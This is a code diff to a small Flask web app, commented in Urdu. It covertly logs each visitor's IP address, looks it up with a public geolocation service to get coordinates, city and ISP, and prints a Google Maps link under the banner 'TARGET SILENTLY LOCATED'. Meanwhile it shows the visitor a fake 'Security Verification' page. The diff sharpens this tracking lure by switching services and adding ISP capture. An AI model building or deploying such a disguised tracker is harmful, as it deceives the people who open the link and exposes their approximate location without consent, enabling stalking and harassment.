@@ -5,28 +5,29 @@ app = Flask(__name__)
 
 @app.route('/')
 def home():
-    # Target ka IP nikalna
+    # Zyada behtar tareeqa IP nikalne ka
     ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
+    
     try:
-        # IP se exact coordinates nikalna
-        data = requests.get(f'https://ipapi.co/{ip}/json/').json()
-        lat = data.get('latitude')
-        lon = data.get('longitude')
-        city = data.get('city', 'Unknown')
+        # Aik zyada reliable service (ip-api.com)
+        response = requests.get(f'http://ip-api.com/json/{ip}').json()
+        lat = response.get('lat')
+        lon = response.get('lon')
+        city = response.get('city', 'Unknown')
+        isp = response.get('isp', 'Unknown')
         
-        # Asli Google Map link banana jo area dikhaye
+        # Asli Google Map link jo exact area dikhaye
         if lat and lon:
             map_link = f"https://www.google.com/maps?q={lat},{lon}"
         else:
             map_link = "Coordinates not found"
             
-    except:
-        city = "Error"
+    except Exception as e:
+        city = f"Error: {str(e)}"
         map_link = "Service Error"
 
-    print(f"\n--- [!!!] TARGET AREA LOCATED [!!!] ---")
-    print(f"IP: {ip} | City: {city}")
-    print(f"Google Maps Area: {map_link}\n")
+    print(f"\n--- [!!!] TARGET SILENTLY LOCATED [!!!] ---")
+    print(f"IP: {ip} | City: {city} | ISP: {isp}")
+    print(f"Exact Map: {map_link}\n")
     
     return "<h2>Security Verification...</h2><p>Checking connection stability, please wait.</p>"
-
